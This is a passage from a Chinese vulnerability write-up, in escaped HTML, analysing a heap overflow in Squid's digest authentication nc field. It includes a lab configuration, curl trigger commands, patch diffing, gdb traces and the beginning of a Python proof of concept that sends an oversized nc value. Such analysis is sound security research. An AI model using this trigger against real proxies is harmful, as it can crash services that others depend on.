style="color:#e6db74">&amp;#39;--enable-auth-ntlm=fake,SMB_LM&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-external-acl-helpers=file_userip,LDAP_group,SQL_session,unix_group,wbinfo_group&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-security-cert-validators=fake&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-storeid-rewrite-helpers=file&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-url-rewrite-helpers=fake&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-eui&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-esi&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-zph-qos&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--disable-translation&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--with-swapdir=/var/spool/squid&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--with-logdir=/var/log/squid&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--with-pidfile=/run/squid.pid&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--with-filedescriptors=65536&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--with-large-files&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--with-default-user=proxy&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--enable-linux-netfilter&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--without-systemd&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--with-gnutls&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;build_alias=x86_64-linux-gnu&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;CFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;LDFLAGS=-Wl,-z,relro -Wl,-z,now &amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;CXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations&amp;#39;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;--disable-optimizations&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>配置在squid.conf添加如下&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-conf" data-lang="conf">auth_param digest program /usr/lib/squid/digest_file_auth -c /etc/squid/password.digest
auth_param digest realm localhost
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_port 3128
test:localhost:39df1982ed1fef9f74ecd670a2a93c66
&lt;/code>&lt;/pre>&lt;p>使用如下请求触发&lt;/p>
&lt;pre tabindex="0">&lt;code>curl -i -k http://116.62.202.230 -x 192.168.59.197:3128 -U test:123456 --proxy-digest
&lt;/code>&lt;/pre>&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>补丁分析&lt;/strong>&lt;/p>
&lt;p>补丁修复于&lt;code>src\auth\digest\Config.cc&lt;/code>，可以看出补丁主要是对value.size进行了判断，在修复前虽然判断了value.size()是否为8，但仅仅打印了一条调试信息，后面仍然调用xstrncpy进行复制。
在补丁处如果nc参数不是8则不会调用xstrncpy进行复制。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/squid-dos.zh-cn.assets/1.png" />&lt;/p>
&lt;p>而xstrncpy要写入的长度参数来源于value.size()，value是一个String类型变量&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">case&lt;/span> DIGEST_NC:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (value.&lt;span style="color:#a6e22e">size&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">debugs&lt;/span>(&lt;span style="color:#ae81ff">29&lt;/span>, &lt;span style="color:#ae81ff">9&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Invalid nc &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> value &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; in &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> temp &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">xstrncpy&lt;/span>(digest_request&lt;span style="color:#f92672">-&amp;gt;&lt;/span>nc, value.&lt;span style="color:#a6e22e">rawBuf&lt;/span>(), value.&lt;span style="color:#a6e22e">size&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">debugs&lt;/span>(&lt;span style="color:#ae81ff">29&lt;/span>, &lt;span style="color:#ae81ff">9&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Found noncecount &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> digest_request&lt;span style="color:#f92672">-&amp;gt;&lt;/span>nc &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">xstrncpy&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>dst, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>src, &lt;span style="color:#66d9ef">size_t&lt;/span> n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>r &lt;span style="color:#f92672">=&lt;/span> dst;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>n &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>dst)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> dst;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (src)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#f92672">--&lt;/span>n &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>src &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>dst &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>src;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>dst;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>src;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>dst &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> r;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看出这是一个越界写漏洞，可以造成堆溢出。
&lt;strong>动态调试&lt;/strong>&lt;/p>
&lt;p>断点如下&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ b Auth::Digest::Config::decode
gef➤ b Config.cc:829
&lt;/code>&lt;/pre>&lt;p>通过curl触发断点&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -i -k http://host -x 192.168.59.197:3128 -U test:123456 --proxy-digest
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此时调用栈如下&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ bt
#0 Auth::Digest::Config::decode (this=0x55a2e598a470,
proxy_auth=0x55a2e5cc50e7 &amp;#34;username=\&amp;#34;test\&amp;#34;,realm=\&amp;#34;localhost\&amp;#34;,nonce=\&amp;#34;52a18c55ec2a173b665ae8c4d1b947b6\&amp;#34;,uri=\&amp;#34;/\&amp;#34;,cnonce=\&amp;#34;b315dc470396be779b18a73909a139f1\&amp;#34;,nc=00000001,response=\&amp;#34;edda2d0982c717bd74ad9989da11b158\&amp;#34;,qop=\&amp;#34;auth\&amp;#34;&amp;#34;,
request=0x55a2e61210e0, aRequestRealm=0x0) at Config.cc:830
#1 0x000055a2e483a895 in Auth::SchemeConfig::CreateAuthUser (
proxy_auth=0x55a2e5cc50e0 &amp;#34;Digest username=\&amp;#34;test\&amp;#34;,realm=\&amp;#34;localhost\&amp;#34;,nonce=\&amp;#34;52a18c55ec2a173b665ae8c4d1b947b6\&amp;#34;,uri=\&amp;#34;/\&amp;#34;,cnonce=\&amp;#34;b315dc470396be779b18a73909a139f1\&amp;#34;,nc=00000001,response=\&amp;#34;edda2d0982c717bd74ad9989da11b158\&amp;#34;,qop=\&amp;#34;auth\&amp;#34;&amp;#34;, al=...)
at SchemeConfig.cc:55
#2 0x000055a2e4840d94 in Auth::UserRequest::authenticate (auth_user_request=0x55a2e611ee20,
headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:354
#3 0x000055a2e4841952 in Auth::UserRequest::tryToAuthenticateAndSetAuthUser (aUR=0x55a2e611ee20,
headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:453
#4 0x000055a2e4807766 in AuthenticateAcl (ch=0x55a2e611ec88) at Acl.cc:57
#5 0x000055a2e4809a2d in ACLProxyAuth::match (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at AclProxyAuth.cc:55
#6 0x000055a2e4861813 in ACL::matches (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at Acl.cc:171
#7 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598bc50, pos=0x55a2e598ac40,
child=0x55a2e598ac40) at Checklist.cc:93
#8 0x000055a2e4866018 in Acl::AndNode::doMatch (this=0x55a2e598bc50, checklist=0x55a2e611ec88, start=0x55a2e598ac40)
at BoolOps.cc:76
#9 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at InnerNode.cc:91
#10 0x000055a2e4861813 in ACL::matches (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at Acl.cc:171
#11 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598c098, pos=0x55a2e598bc50,
child=0x55a2e598bc50) at Checklist.cc:93
#12 0x000055a2e4866198 in Acl::OrNode::doMatch (this=0x55a2e598c098, checklist=0x55a2e611ec88, start=0x55a2e598bc50)
at BoolOps.cc:114
#13 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598c098, checklist=0x55a2e611ec88) at InnerNode.cc:91
#14 0x000055a2e4861813 in ACL::matches (this=0x55a2e598c098, checklist=0x55a2e611ec88) at Acl.cc:171
#15 0x000055a2e4867883 in ACLChecklist::matchAndFinish (this=0x55a2e611ec88) at Checklist.cc:295
#16 0x000055a2e4867691 in ACLChecklist::nonBlockingCheck (this=0x55a2e611ec88,
callback_=0x55a2e4749b13 &amp;lt;clientAccessCheckDoneWrapper(Acl::Answer, void*)&amp;gt;, callback_data_=0x55a2e611e8b8)
at Checklist.cc:254
#17 0x000055a2e47498dc in ClientRequestContext::clientAccessCheck (this=0x55a2e611e8b8) at client_side_request.cc:660
#18 0x000055a2e474da2d in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1704
#19 0x000055a2e4748ec8 in ClientRequestContext::hostHeaderVerify (this=0x55a2e611e8b8) at client_side_request.cc:608
#20 0x000055a2e474d8ff in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1697
#21 0x000055a2e4727ff3 in clientProcessRequest (conn=0x55a2e6118e78, hp=..., context=0x55a2e611a740) at client_side.cc:1759
#22 0x000055a2e48b338e in Http::One::Server::processParsedRequest (this=0x55a2e6118e78, context=...) at Http1Server.cc:284
#23 0x000055a2e4729260 in ConnStateData::clientParseRequests (this=0x55a2e6118e78) at client_side.cc:1948
#24 0x000055a2e472961a in ConnStateData::afterClientRead (this=0x55a2e6118e78) at client_side.cc:1982
#25 0x000055a2e48b701c in Server::doClientRead (this=0x55a2e6118e78, io=...) at Server.cc:183
#26 0x000055a2e48b8250 in CommCbMemFunT&amp;lt;Server, CommIoCbParams&amp;gt;::doDial (this=0x55a2e6117458) at ../../src/CommCalls.h:190
#27 0x000055a2e48b832b in JobDialer&amp;lt;Server&amp;gt;::dial (this=0x55a2e6117458, call=...) at ../../src/base/AsyncJobCalls.h:175
#28 0x000055a2e48b8137 in AsyncCallT&amp;lt;CommCbMemFunT&amp;lt;Server, CommIoCbParams&amp;gt; &amp;gt;::fire (this=0x55a2e6117420)
at ../../src/base/AsyncCall.h:147
#29 0x000055a2e48d2d3c in AsyncCall::make (this=0x55a2e6117420) at AsyncCall.cc:44
#30 0x000055a2e48d3e50 in AsyncCallQueue::fire (this=0x55a2e5ca15d0) at AsyncCallQueue.cc:27
#31 0x000055a2e4669475 in EventLoop::dispatchCalls (this=0x7ffd91608f90) at EventLoop.cc:144
#32 0x000055a2e4669381 in EventLoop::runOnce (this=0x7ffd91608f90) at EventLoop.cc:121
#33 0x000055a2e46691d4 in EventLoop::run (this=0x7ffd91608f90) at EventLoop.cc:83
#34 0x000055a2e47a0842 in SquidMain (argc=0x3, argv=0x7ffd916091a8) at main.cc:1661
#35 0x000055a2e479fa03 in SquidMainSafe (argc=0x3, argv=0x7ffd916091a8) at main.cc:1353
#36 0x000055a2e479f9bd in main (argc=0x3, argv=0x7ffd916091a8) at main.cc:1341
&lt;/code>&lt;/pre>&lt;p>在gdb中可以看到value值为传入的请求的nc的值&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ p value
$1 = {
static npos = 0xffffffffffffffff,
size_ = 0x28,
len_ = 0x8,
static SizeMax_ = 0xffff,
buf_ = 0x55a2e6125a60 &amp;#34;00000001&amp;#34;
}
&lt;/code>&lt;/pre>&lt;p>长度为nc的长度，此时只需要nc长度超过目标缓冲区 &lt;code>digest_request-&amp;gt;nc&lt;/code>即可造成堆溢出。查看 &lt;code>digest_request&lt;/code>定义可知nc大小为9&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>class UserRequest : public Auth&lt;span style="color:#f92672">::&lt;/span>UserRequest
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">MEMPROXY_CLASS&lt;/span>(Auth&lt;span style="color:#f92672">::&lt;/span>Digest&lt;span style="color:#f92672">::&lt;/span>UserRequest);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">UserRequest&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#a6e22e">UserRequest&lt;/span>() override;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">authenticated&lt;/span>() &lt;span style="color:#66d9ef">const&lt;/span> override;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">authenticate&lt;/span>(HttpRequest &lt;span style="color:#f92672">*&lt;/span> request, ConnStateData &lt;span style="color:#f92672">*&lt;/span> conn, Http&lt;span style="color:#f92672">::&lt;/span>HdrType type) override;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Direction &lt;span style="color:#a6e22e">module_direction&lt;/span>() override;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">addAuthenticationInfoHeader&lt;/span>(HttpReply &lt;span style="color:#f92672">*&lt;/span> rep, &lt;span style="color:#66d9ef">int&lt;/span> accel) override;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#if WAITING_FOR_TE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> virtual &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">addAuthenticationInfoTrailer&lt;/span>(HttpReply &lt;span style="color:#f92672">*&lt;/span> rep, &lt;span style="color:#66d9ef">int&lt;/span> accel);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">startHelperLookup&lt;/span>(HttpRequest &lt;span style="color:#f92672">*&lt;/span>request, AccessLogEntry&lt;span style="color:#f92672">::&lt;/span>Pointer &lt;span style="color:#f92672">&amp;amp;&lt;/span>al, AUTHCB &lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>) override;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">credentialsStr&lt;/span>() override;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>noncehex; &lt;span style="color:#75715e">/* &amp;#34;dcd98b7102dd2f0e8b11d0f600bfb0c093&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>cnonce; &lt;span style="color:#75715e">/* &amp;#34;0a4f113b&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>realm; &lt;span style="color:#75715e">/* = &amp;#34;testrealm@host.com&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pszPass; &lt;span style="color:#75715e">/* = &amp;#34;Circle Of Life&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>algorithm; &lt;span style="color:#75715e">/* = &amp;#34;md5&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> nc[&lt;span style="color:#ae81ff">9&lt;/span>]; &lt;span style="color:#75715e">/* = &amp;#34;00000001&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pszMethod; &lt;span style="color:#75715e">/* = &amp;#34;GET&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>qop; &lt;span style="color:#75715e">/* = &amp;#34;auth&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>uri; &lt;span style="color:#75715e">/* = &amp;#34;/dir/index.html&amp;#34; */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>response;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>digest_request为Auth::Digest::UserRequest指针，使用new分配内存，位于堆内&lt;/p>
&lt;p>&lt;strong>PoC构造&lt;/strong>&lt;/p>
&lt;p>漏洞代码对应于处理[[../06 Protocol/HTTP digest身份认证|HTTP digest 认证]]，通过该认证请求需要发送两次请求，第一次不携带认证头，此时squid会返回407，需要提取响应中的nonce，简单的使用python即可构造
PoC&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> requests.auth &lt;span style="color:#f92672">import&lt;/span> HTTPDigestAuth
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> string
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> hashlib
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>proxies&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;http&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;http://192.168.59.197:3128&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;https&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;http://192.168.59.197:3128&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>resp_407&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">Digest realm=&amp;#34;localhost&amp;#34;, nonce=&amp;#34;47e5f5dc8b7237cf1153065afe358c89&amp;#34;, qop=&amp;#34;auth&amp;#34;, stale=false&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rr&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;Digest username=&amp;#34;test&amp;#34;,realm=&amp;#34;localhost&amp;#34;,nonce=&amp;#34;47e5f5dc8b7237cf1153065afe358c89&amp;#34;,uri=&amp;#34;/&amp;#34;,cnonce=&amp;#34;a0824a23a0394203c3023085915fd744&amp;#34;,nc=00000001,response=&amp;#34;b45560b922d64786ef7d6c96c9071dfa&amp;#34;,qop=&amp;#34;auth&amp;#34;&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>data&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;Digest username=&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{username}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;,realm=&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{realm}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;,nonce=&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{nonce}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;,uri=&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{uri}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;,cnonce=&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{cnonce}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;,nc=&lt;/span>&lt;span style="color:#e6db74">{nc}&lt;/span>&lt;span style="color:#e6db74">,response=&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{response}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;,qop=&amp;#34;auth&amp;#34;&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>password&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;123456&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>realm&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;localhost&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nc&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;00000001&amp;#34;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cnonce &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(random&lt;span style="color:#f92672">.&lt;/span>choice(string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase &lt;span style="color:#f92672">+&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>digits) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">32&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
